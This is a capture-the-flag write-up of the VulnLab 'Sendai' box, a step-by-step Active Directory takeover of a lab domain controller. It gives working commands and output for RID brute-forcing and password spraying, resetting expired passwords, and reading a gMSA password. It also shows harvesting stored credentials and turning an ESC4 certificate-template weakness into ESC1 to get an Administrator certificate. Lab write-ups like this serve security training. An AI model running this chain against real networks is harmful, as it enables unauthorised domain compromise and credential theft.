---
title: "Sendai"
---

# Vulnlab - Sendai Writeup 

![Sendai screenshot](sendai.png)

Welcome reader, today we’ll hack **Sendai** from VulnLab. Sendai involved enumerating usernames through smb shares having password expired, resetting their password, belonging to Support group they had GenericAll on ADMSVC group which had ReadGMSAPassword on MGTSVC$ , enumerating the system to find clifford’s password which was part of ca-operators group having full control over SendaiComputer template making it vulnerable to ESC4, then changing the configuration to make it vulnerable to ESC1, escalating to domain admin.



## Enumeration

I started with a full Nmap scan of the target.

```bash
nmap -sV -sC -Pn 10.10.87.215
```

The scan showed a typical Windows domain controller with IIS, LDAP, Kerberos, SMB, and RDP.

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-29 19:59:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sendai.vl
|_http-title: IIS Windows Server
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SENDAI
|   NetBIOS_Domain_Name: SENDAI
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sendai.vl
|   DNS_Computer_Name: dc.sendai.vl
|   DNS_Tree_Name: sendai.vl
|   Product_Version: 10.0.20348
Service Info: Host: DC; OS: Windows
```

I added `dc.sendai.vl` and `sendai.vl` to my `/etc/hosts` and checked the website, but it was just the default IIS page. Gobusting did not reveal anything interesting, so I moved to SMB and LDAP enumeration.

## RID Brute

Anonymous LDAP was not available, but guest access to SMB worked, so I used RID brute to enumerate users.

```bash
nxc smb dc.sendai.vl --rid-brute -u Guest -p ""
```

That returned a long list of domain users and groups, including service accounts and staff users.

```text
SMB         10.10.87.215    445    DC               [+] sendai.vl\Guest:
SMB         10.10.87.215    445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.10.87.215    445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.10.87.215    445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.10.87.215    445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.10.87.215    445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.10.87.215    445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.10.87.215    445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.10.87.215    445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.10.87.215    445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.10.87.215    445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.10.87.215    445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.10.87.215    445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.10.87.215    445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.10.87.215    445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.10.87.215    445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.10.87.215    445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.10.87.215    445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.10.87.215    445    DC               1131: SENDAI\support (SidTypeGroup)
```

I tried ASREPRoasting against the list, but that did not give anything useful.

## SMB Shares

Next, I checked the available SMB shares as guest.

```bash
smbclient -L \\\\dc.sendai.vl\\ -U "guest"
```

The interesting shares were `config`, `sendai`, and `Users`.

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
config          Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
sendai          Disk      company share
SYSVOL          Disk      Logon server share
Users           Disk
```

I started with the `sendai` share and found a note about expired passwords.

```text
Dear valued employees,

We would like to inform you that a significant number of user accounts have weak and insecure passwords.

All user accounts with insecure passwords have been expired as a precautionary measure.
```

That meant expired accounts might still be recoverable by forcing a password reset.

## Password Reset

I sprayed an empty password against the user list and found two accounts with expired passwords.

```bash
nxc smb dc.sendai.vl --rid-brute -u user.list -p "" --continue-on-success
```

The accounts were:

- `Elliot.Yates`
- `Thomas.Powell`

I reset both passwords with Impacket’s `smbpasswd.py`.

```bash
smbpasswd.py elliot.yates@sendai.vl -newpass Password123
smbpasswd.py thomas.powell@sendai.vl -newpass Password123
```

Both password changes succeeded.

## User Shell

After that, I ran BloodHound collection to map the environment.

```bash
bloodhound-python -d sendai.vl -u Thomas.Powell -p Password123 -c all --zip -ns 10.10.87.215
```

BloodHound showed that the users were in the `Support` group, and there was a path through `admsvc` to the `mgtsvc` gMSA account.

I added `Thomas.Powell` to the `admsvc` group.

```bash
net rpc group addmem "ADMSVC" "thomas.powell" -U "SENDAI.VL"/"thomas.powell"%"Password123" -S sendai.vl
```

Then I used `bloodyAD` to read the managed password for `mgtsvc$`.

```bash
bloodyAD --host sendai.vl -d "sendai.vl" -u "Thomas.Powell" -p "Password123" get object MGTSVC$ --attr msDS-ManagedPassword
```

That gave me access to the `MGTSVC` account.

## Root Path

Once I had higher privileges, I checked `C:\config` and found a SQL config file with another password.

```text
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=[SNIPPED];
```

I sprayed that password across the user list and got the `sqlsvc` account.

```bash
nxc smb sendai.vl -u user.list -p [PASSWORD] --continue-on-success
```

At this point I had two possible paths forward: SQL or ADCS.

The ADCS path looked more promising because the `ca-operators` group existed, and the `SendaiComputer` certificate template was vulnerable to **ESC4**.

```text
"Certificate Templates": {
  "0": {
    "Template Name": "SendaiComputer",
    "Display Name": "SendaiComputer",
    ...
    "[!] Vulnerabilities": {
      "ESC4": "'SENDAI.VL\\\\ca-operators' has dangerous permissions"
    }
  }
}
```

I ran `PrivescCheck` and found the password for `clifford.davey` in the `helpdesk.exe` service command line.

```text
ImagePath   : C:\WINDOWS\helpdesk.exe -u clifford.davey -p [SNIPPED] -k netsvcs
User        : LocalSystem
StartMode   : Automatic
```

With that credential, I modified the template to make it vulnerable to ESC1.

```bash
certipy template -username clifford.davey@sendai.vl -password [PASS] -dc-ip 10.10.114.72 -template SendaiComputer -save-old
```

Then I requested a certificate as `administrator@sendai.vl`.

```bash
certipy req -username clifford.davey@sendai.vl -password [PASS] -dc-ip 10.10.114.72 -ca sendai-DC-CA -target dc.sendai.vl -template SendaiComputer -upn administrator@sendai.vl
```

After that, I authenticated with the generated PFX.

```bash
certipy auth -pfx administrator.pfx -username administrator -domain sendai.vl -dc-ip 10.10.114.72
```

Finally, I restored the template config to clean up.

```bash
certipy template -username clifford.davey@sendai.vl -password [PASS] -dc-ip 10.10.114.72 -template SendaiComputer -configuration SendaiComputer.json
```

With the Administrator ticket, I logged in over WinRM and grabbed the flag.

## Attack Path

- **Enumerate the target** — identify IIS, LDAP, Kerberos, SMB, and RDP.
- **RID brute through SMB** — collect usernames and service accounts.
- **Inspect the shares** — find password-expiration notes and a `config` share.
- **Reset expired passwords** — change the passwords for `Elliot.Yates` and `Thomas.Powell`.
- **Map the domain** — use BloodHound to find the `admsvc` and gMSA path.
- **Abuse group membership** — add `Thomas.Powell` to `ADMSVC`.
- **Read the gMSA password** — extract `mgtsvc$` via `bloodyAD`.
- **Find SQL credentials** — pull a password from `C:\config`.
- **Go after ADCS** — identify the vulnerable `SendaiComputer` template and ESC4 rights.
- **Leak a CA operator password** — recover `clifford.davey` from `helpdesk.exe`.
- **Convert ESC4 to ESC1** — rewrite the template and request a certificate as Administrator.
- **Authenticate with the certificate** — use the PFX to get an admin ticket.
- **Log in as Administrator** — use WinRM to finish the box and read the flag.
